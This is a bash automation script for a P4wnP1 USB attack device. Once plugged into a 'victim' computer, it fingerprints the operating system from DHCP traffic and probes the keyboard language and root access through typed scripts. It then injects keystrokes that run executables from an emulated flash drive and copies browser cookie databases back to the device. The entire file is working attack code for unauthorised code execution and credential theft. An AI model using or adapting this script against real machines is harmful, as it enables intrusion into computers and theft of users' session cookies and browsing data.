## Call on usb connection

# needs cronjob
#SHELL=/bin/bash
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
#@reboot /usr/bin/python3 /root/scripts/analyze-pcap.py &

# unmount the mass storage device and remove all old files
# also stop executing the script
# especially needed if the OS could not be detected
function cleanStop {
        # do clean up
        # this is needed, otherwise an old language.txt is still on the drive
        # and our language checks will return wrong results
        echo "$(date +"%T") : cleanup - removing mass storage" >> /root/hosts/log.txt
	# unmount mass storage (for cmd feedback) from P4wnP1
	umount /mnt
        # unmount mass storage from victim
        P4wnP1_cli usb set --rndis --cdc-ecm --hid-keyboard --hid-mouse
        sleep 1

	# clean all drives
	drives=("500mb.bin"  "ntfs.bin")
	for d in ${drives[*]}
	do
		# mount the drive (ingored here the optional type parameter)
		mount -o loop /usr/local/P4wnP1/ums/flashdrive/$d /mnt
		sleep 1
        	# remove all files (incl. hidden files) from drive
        	rm -r /mnt/* 2>/dev/null
        	rm -r /mnt/.* 2>/dev/null
        	# copy payloads to the drive
        	cp /root/hosts/payloads/* /mnt/
        	# unmount the drive
        	umount /mnt
		echo "$(date +"%T") : cleared image $d" >> /root/hosts/log.txt
        	sleep 3
	done

	# remove old packet capture
	rm /root/sniff.pcap 2>/dev/null
	# remove communication files
	rm /root/hosts/os.txt 2>/dev/null
	rm /root/hosts/ready.txt 2>/dev/null

	echo "$(date +"%T") : cleanup done - exit" >> /root/hosts/log.txt
	# show led full to indicate that the Pi can be safely removed
	/usr/local/bin/P4wnP1_cli led -b 255
        exit
}

# clear log file
cat /dev/null > /root/hosts/log.txt

# manually sync swclock to hwclock (first entry could be otherwise wrong - maybe this fixes this problem)
hwclock -s
echo "$(date +"%T") : USB connection established" >> /root/hosts/log.txt
echo "$(date +"%T") : waiting for Python DHCP watch process" >> /root/hosts/log.txt

until [ -f /root/hosts/ready.txt ]
do
    sleep 1
done

## Debugging
# allow to only start if start.txt exists
until [ -f /root/hosts/start.txt ]
do
    sleep 1
done
rm /root/hosts/start.txt


# Start usb gadgets
# Added on 09.05.2021: --vid "0x1abc"
/usr/local/bin/P4wnP1_cli usb set --cdc-ecm --rndis --ums --hid-keyboard --vid "0x1abc"

echo "$(date +"%T") : Python is ready - starting sniffing" >> /root/hosts/log.txt
# 14.02.21 - commented out because this should not be needed
#/usr/local/bin/P4wnP1_cli template deploy -n "usbeth_dhcp-testing"

# start tcpdump and let it run for 10 sec
timeout 10 /usr/bin/tcpdump -i usbeth port 67 or port 68 -w /root/sniff.pcap 2>/dev/null

# tell the script it can analyze the dump now
touch /root/hosts/done-sniffing.txt

echo "$(date +"%T") : analyzing recorded tcpdump ..." >> /root/hosts/log.txt
until [ -f /root/hosts/done-analyzing.txt ]
do
	sleep 1
done

rm /root/hosts/done-analyzing.txt

# check if the analyze script could detect a DHCP request packet
if [ -f /root/hosts/os.txt ]
then
	echo "$(date +"%T") : analyzing successful" >> /root/hosts/log.txt
else
	echo "$(date +"%T") : no packets found - retrying sniffing ..." >> /root/hosts/log.txt
	# macOS is a special case because it can not auth via the ethernet adapter if RNDIS is activated
        # tries to use CDC-ECM only in order to check if the device is a Mac
	# keyboard is activated, mass storage is activated (file will be set later), uses only CDC-ECM
        # Added on 09.05.2021: --vid "0x1abc", also needed for macOS case?
	/usr/local/bin/P4wnP1_cli usb set --cdc-ecm --ums --hid-keyboard --vid "0x1abc"

	# start tcpdump and let it run for 20 sec
	timeout 20 /usr/bin/tcpdump -i usbeth port 67 or port 68 -w /root/sniff.pcap 2>/dev/null

	# tell the script it can analyze the dump now
	touch /root/hosts/done-sniffing.txt

	echo "$(date +"%T") : analyzing recorded tcpdump ..." >> /root/hosts/log.txt
	until [ -f /root/hosts/done-analyzing.txt ]
	do
        	sleep 1
	done

	rm /root/hosts/done-analyzing.txt

	if [ -f /root/hosts/os.txt ]
	then
		echo "$(date +"%T") : analyzing successful" >> /root/hosts/log.txt
		# restart USB gadgets --> bug? can not use HID if only RNDIS or only CDC-ECM is available (on Windows)
		P4wnP1_cli usb set --disable
		sleep 2
        	P4wnP1_cli usb set --hid-keyboard --hid-mouse --ums
	else
		echo "$(date +"%T") : second analyzing try failed - stopping" >> /root/hosts/log.txt
		cleanStop
	fi

fi


os=$(cat /root/hosts/os.txt 2>/dev/null)
if echo $os | grep -q "Unknown"
then
        echo "$(date +"%T") : could not detect the OS - stopping" >> /root/hosts/log.txt
        cleanStop
else
        echo "$(date +"%T") : detected OS: $os" >> /root/hosts/log.txt
        # change the HID-script os variable so the script can behave depending on the os
        # var os = 'xyz' --> var os = 'Ubuntu' / 'Windows' / 'Unknown'
        sed -i "s/var os = '.*'/var os = '$os'/" /usr/local/P4wnP1/HIDScripts/keyboard.js
	# adjust the drive so rwx does work ootb on all os
	if [ $os = "Ubuntu" ]
	then
		drive="ntfs.bin"
	else
		drive="500mb.bin"
	fi

	# mount the correct drive depending on the os (default is UMS activated but no image set)
	P4wnP1_cli usb mount --ums-file /usr/local/P4wnP1/ums/flashdrive/$drive
	echo "$(date +"%T") : mounting drive: $drive" >> /root/hosts/log.txt
fi

# a bit hacky because we do not exactly know, when the windows drive pop-up appears...
if [ $os = "Windows" ]
then
	sleep 15
else
	sleep 5
fi

# do not use absolute path...
P4wnP1_cli hid run keyboard.js

# mount as read only so we do not have to remount the mass storage every time
mount -r -o loop /usr/local/P4wnP1/ums/flashdrive/$drive /mnt 2>>/root/hosts/log.txt
sleep 2
# sync drive contents
echo 3 > /proc/sys/vm/drop_caches

if cat /mnt/language.txt 2>/dev/null | grep -q "de"
then
        echo "$(date +"%T") : keyboard language is german" >> /root/hosts/log.txt
        keyLang="de"
else
        sed -i "s/var lang = 'de'/var lang = 'us'/" /usr/local/P4wnP1/HIDScripts/keyboard.js
        P4wnP1_cli hid run keyboard.js
        echo 3 > /proc/sys/vm/drop_caches

        if cat /mnt/language.txt 2>/dev/null | grep -q "us"
        then
                echo "$(date +"%T") : keyboard language is english" >> /root/hosts/log.txt
                keyLang="us"
                # reset keyboard.js lang to default (de)
                sed -i "s/var lang = 'us'/var lang = 'de'/" /usr/local/P4wnP1/HIDScripts/keyboard.js
        else
                sed -i "s/var lang = 'us'/var lang = 'fr'/" /usr/local/P4wnP1/HIDScripts/keyboard.js
                P4wnP1_cli hid run keyboard.js
                echo 3 > /proc/sys/vm/drop_caches
                if cat /mnt/language.txt 2>/dev/null | grep -q "fr"
                then
                        echo "$(date +"%T") : keyboard language is french" >> /root/hosts/log.txt
                        keyLang="fr"
                        # reset keyboard.js lang to default (de)
                        sed -i "s/var lang = 'fr'/var lang = 'de'/" /usr/local/P4wnP1/HIDScripts/keyboard.js
                else
                        echo "$(date +"%T") : unknown keyboard language - stopping" >> /root/hosts/log.txt
                        # reset keyboard.js lang to default (de)
                        sed -i "s/var lang = 'fr'/var lang = 'de'/" /usr/local/P4wnP1/HIDScripts/keyboard.js
                        cleanStop
                fi
        fi
fi


## PAYLOAD SECTION ##
# set your payload and the file to check if the payload execution is done
# this is needed if you have payloads that execute not instantly, e.g. copy files to the mass drive
# (typing time != execution time --> no instant execution, we can not rely on the successful cmd type)

## binary executable payload
# set payload to "payload-execute.js" if executables are in ~/hosts/payloads/ available
# they should be named like this: "win.exe", "lin", "mac"
payload="payload-execute.js"
# it's also possible to define command line arguments for the executable
# it's recommended to use / for paths, because this should work on all platforms
cmdArgs=""
# this is needed for detecting the execution finish
doneFile="done.txt"
# is root/ admin needed for the payload execution?
# if set to 1 the script uses "sudo" as prefix or a "run as admin"-started terminal
#needRoot=0

## HID payload example
#payload="stealFirefoxPlaces.js"
#doneFile="places.txt"

# maxTries * 2 = seconds to wait for completion of a given payload
maxTries=15

# add here your cp wildcard to extract files from the mass storage, uncomment if not used
extractFiles="cookies[0-9]*.sqlite"

# check if root rights on windows, macos or linux are available?
rootCheck=1


echo "$(date +"%T") : adjusting payload" >> /root/hosts/log.txt
# adjust os
sed -i "s/var os = '.*'/var os = '$os'/" /usr/local/P4wnP1/HIDScripts/$payload
# adjust keylang
sed -i "s/var lang = '.*'/var lang = '$keyLang'/" /usr/local/P4wnP1/HIDScripts/$payload

if [ $rootCheck -eq 1 ]
then
	# adjust root-check script
	echo "$(date +"%T") : root check enabled" >> /root/hosts/log.txt
	sed -i "s/var os = '.*'/var os = '$os'/" /usr/local/P4wnP1/HIDScripts/root-check.js
	sed -i "s/var lang = '.*'/var lang = '$keyLang'/" /usr/local/P4wnP1/HIDScripts/root-check.js
	# run root-check
	P4wnP1_cli hid run "root-check.js"
	sleep 1
	echo 3 > /proc/sys/vm/drop_caches
	if [ -f /mnt/root.txt ]
	then
		echo "$(date +"%T") : root available" >> /root/hosts/log.txt
		rootAvailable=1
	else
		echo "$(date +"%T") : root not available" >> /root/hosts/log.txt
		rootAvailable=0
	fi
fi

# set cmd arguments (only for executable payload)
if [ $payload = "payload-execute.js" ]
then
	sed -i "s/var cmdArgs = '.*'/var cmdArgs = '$cmdArgs'/" /usr/local/P4wnP1/HIDScripts/$payload

	# if root needed then use "sudo"-prefix or a "run as admin"-started terminal
        # for the payload bin execution file
        if [ $needRoot -eq 1 ]
        then
                sed -i "s/var needRoot = '.*'/var needRoot = 'true'/" /usr/local/P4wnP1/HIDScripts/$payload
        else
		sed -i "s/var needRoot = '.*'/var needRoot = 'false'/" /usr/local/P4wnP1/HIDScripts/$payload
	fi

	# if we've checked root and do not have root then stop (because it will defintely not work)
	if [ -v rootAvailable ]
	then
		if [ $rootAvailable -eq 0 ] && [ $needRoot -eq 1 ]
		then
			echo "$(date +"%T") : stopping - reason: root not available" >> /root/hosts/log.txt
			cleanStop
		fi
	fi

fi

echo "$(date +"%T") : executing payload" >> /root/hosts/log.txt
P4wnP1_cli hid run $payload

# check continuous if the payload is done
iterations=0
until [ -f /mnt/$doneFile ]
do
	# check if we have already waited more than wanted (default 30 seconds)
	# if so: stop and clean up (sth probably did not work)
	if (( iterations > maxTries ))
	then
		echo "$(date +"%T") : stopping - reason: waited more than $((maxTries*2)) seconds for feedback" >> /root/hosts/log.txt
		cleanStop
	fi
  	sleep 2
	((iterations=iterations+1))
	echo 3 > /proc/sys/vm/drop_caches
done

echo "$(date +"%T") : payload execution is done" >> /root/hosts/log.txt

# try to backup copied places data (from victim) if there are any
# in a newly created folder (y-m-d_hms)
if ! test -z "$extractFiles"
then
	echo "$(date +"%T") : extracting files from mass storage" >> /root/hosts/log.txt
	newFolderName=$(date +%Y-%m-%d_%H%M%S)
	mkdir /root/hosts/$newFolderName
	cp /mnt/$extractFiles /root/hosts/$newFolderName 2>>/root/hosts/log.txt
	cleanStop
else
	cleanStop
fi
